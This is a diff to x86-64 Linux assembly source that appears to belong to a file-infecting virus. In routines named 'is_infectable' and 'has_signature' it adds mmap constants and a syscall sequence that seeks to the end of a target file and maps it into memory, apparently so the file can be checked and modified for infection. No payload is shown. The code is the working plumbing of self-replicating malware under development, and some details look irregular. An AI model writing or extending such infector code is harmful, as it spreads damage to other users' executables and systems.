@@ -5,6 +5,7 @@ SYS_WRITE:      equ 1
 SYS_OPEN:       equ 2
 SYS_CLOSE:      equ 3
 SYS_LSEEK:      equ 8
+SYS_MMAP:       equ 9
 SYS_MPROTECT:   equ 10
 SYS_EXIT:       equ 60
 
@@ -12,6 +13,10 @@ SYS_EXIT:       equ 60
 O_RDONLY:   equ 0
 O_WRONLY:   equ 1
 O_RDWR:     equ 2
+
+; mmap flags
+MAP_SHARED:     equ 0x01
+MAP_PRIVATE:    equ 0x02
 
 ; mprotect flags
 PROT_READ:  equ 0x01
@@ -145,7 +150,19 @@ is_infectable:
     has_signature:
         mov rax, SYS_LSEEK
         mov rdi, r8
-        mov rsi, SEEK_END
+        mov rsi, 0
+        mov rdx, SEEK_END
+        syscall
+        
+        mov rsi, rax ; len
+        mov rdi, 0 ; addr
+        mov rax, SYS_MMAP
+        mov rdx, PROT_READ | PROT_WRITE
+        mov r10, MAP_PRIVATE
+        mov r9, 0 ; pgoff
+        syscall
+
+        
     ; has_signature
 
     add sp, 16
